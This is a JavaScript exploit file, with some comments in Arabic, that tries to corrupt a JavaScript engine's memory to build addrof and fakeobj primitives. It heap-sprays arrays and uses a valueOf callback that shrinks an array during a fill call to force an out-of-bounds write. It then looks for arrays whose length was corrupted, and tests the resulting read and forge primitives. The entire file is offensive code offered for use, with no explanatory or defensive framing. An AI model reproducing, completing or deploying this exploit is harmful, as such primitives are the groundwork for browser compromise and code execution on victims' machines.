import { log, sleep } from './module/utils.mjs';

class AddrofFakeobjExploit {
    constructor() {
        this.float_arr = null;
        this.obj_arr = null;
        this.OVERLAP_IDX = 8;
    }

    async execute() {
        // Step 1: Setup memory layout with OOB-write
        await this.setupMemoryCorruption();
        
        // Step 2: Create overlapping arrays
        await this.createOverlappingArrays();
        
        // Step 3: Test primitives
        return await this.testPrimitives();
    }

    async setupMemoryCorruption() {
        // استخدام OOB-write لتغيير طول المصفوفات
        const spray = [];
        
        for (let i = 0; i < 1000; i++) {
            const float_arr = [13.37, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6];
            const obj_arr = [{}, {}, {}, {}, {}, {}, {}];
            spray.push({float_arr, obj_arr});
        }

        // Trigger OOB-write لتغيير طول إحدى المصفوفات
        await this.triggerOOBForLengthCorruption();
        
        return spray;
    }

    async triggerOOBForLengthCorruption() {
        const v0 = [];
        for (let i = 0; i < 50000; i++) {
            v0[i] = [13.37, 1.1, 2.2]; // مصفوفات صغيرة
        }
        
        const v10 = {target: "length_corruption"};
        
        let shrunk = false;
        const o14 = {
            valueOf: () => {
                if (!shrunk) {
                    v0.length = 100;
                    shrunk = true;
                }
                return 0;
            }
        };
        
        v0.fill(v10, o14);
    }

    async createOverlappingArrays() {
        // منع Copy-on-Write
        let noCoW = 13.37;
        
        // إنشاء المصفوفات المتداخلة
        this.float_arr = [noCoW, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6];
        this.obj_arr = [{a: 1}, {b: 2}, {c: 3}, {d: 4}, {e: 5}, {f: 6}, {g: 7}];
        
        // البحث عن المصفوفات التي تغير طولها بسبب OOB-write
        await this.findCorruptedArrays();
    }

    async findCorruptedArrays() {
        const spray = [];
        
        for (let i = 0; i < 500; i++) {
            const float_arr = [13.37, 1.1, 2.2, 3.3];
            const obj_arr = [{x: i}, {y: i}];
            spray.push({float_arr, obj_arr, index: i});
        }

        // 
        await sleep(100);

        for (const item of spray) {
            if (item.float_arr.length > 10) {
                log("Found corrupted float_arr with length: " + item.float_arr.length);
                this.float_arr = item.float_arr;
                this.obj_arr = item.obj_arr;
                break;
            }
        }
    }

    //
    addrof(obj) {
        this.obj_arr[0] = obj;
        return this.float_arr[this.OVERLAP_IDX];
    }

    //
    fakeobj(addr) {
        this.float_arr[this.OVERLAP_IDX] = addr;
        return this.obj_arr[0];
    }

    async testPrimitives() {
        if (!this.float_arr || !this.obj_arr) {
            return false;
        }

        // 
        const testObj = {secret: 0x1337};
        
        try {
            const addr = this.addrof(testObj);
            log("addrof test: " + addr);
            
            const fake = this.fakeobj(addr);
            log("fakeobj test: " + (fake === testObj));
            
            return true;
        } catch (e) {
            log("Primitives test failed: " + e);
            return false;
        }
    }
}

// 
async function main() {
    const exploit = new AddrofFakeobjExploit();
    const success = await exploit.execute();
    
    if (success) {
        log("Addrof/Fakeobj primitives ready!");
        
        // 
        const obj = {data: "test", value: 0x41414141};
        const addr = exploit.addrof(obj);
        log("Object address: " + addr);
        
        const reconstructed = exploit.fakeobj(addr);
        log("Reconstructed object works: " + (reconstructed === obj));
        
    } else {
        log("Failed to create primitives");
    }
}

main();